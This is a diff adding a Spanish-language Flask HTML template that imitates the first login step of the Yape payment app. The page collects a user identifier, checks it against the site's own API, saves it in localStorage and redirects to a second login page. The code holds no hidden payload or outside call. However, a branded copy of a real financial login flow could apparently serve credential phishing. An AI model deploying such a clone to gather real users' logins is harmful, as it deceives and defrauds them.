@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crear cuenta - Yape</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='login.css') }}">
+    <!-- Using Roboto as a close match to the system font -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+</head>
+
+<body>
+    <div class="header">
+        <div class="header-top">Iniciar sesión</div>
+        <h1 class="title">Ingresa tus datos</h1>
+        <p class="subtitle">Completa el formulario. Recuerda que todos los datos son obligatorios.</p>
+    </div>
+
+    <div class="content">
+        <form id="loginForm">
+            <div class="form-group">
+                <input type="text" id="email" class="form-input" placeholder="Correo electrónico o usuario"
+                    autocomplete="off">
+            </div>
+        </form>
+    </div>
+
+    <div class="footer">
+        <button id="btnContinue" class="btn-continue" type="button">Continuar</button>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const emailInput = document.getElementById('email');
+            const btnContinue = document.getElementById('btnContinue');
+
+            // Simple validation to enable button
+            emailInput.addEventListener('input', () => {
+                if (emailInput.value.trim().length > 0) {
+                    btnContinue.classList.add('active');
+                    btnContinue.removeAttribute('disabled');
+                } else {
+                    btnContinue.classList.remove('active');
+                    btnContinue.setAttribute('disabled', 'true');
+                }
+            });
+
+            btnContinue.addEventListener('click', async () => {
+                if (!btnContinue.classList.contains('active')) return;
+
+                const identifier = emailInput.value.trim();
+                btnContinue.setAttribute('disabled', 'true'); // Prevent double click
+
+                try {
+                    const response = await fetch('/api/check_user', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ identifier })
+                    });
+
+                    const data = await response.json();
+
+                    if (data.success) {
+                        localStorage.setItem('yape_user', identifier);
+                        window.location.href = '/login2';
+                    } else {
+                        alert(data.message || 'Usuario no encontrado');
+                        btnContinue.removeAttribute('disabled');
+                    }
+                } catch (error) {
+                    console.error('Error:', error);
+                    alert('Error de conexión');
+                    btnContinue.removeAttribute('disabled');
+                }
+            });
+        });
+    </script>
+</body>
+
+</html>
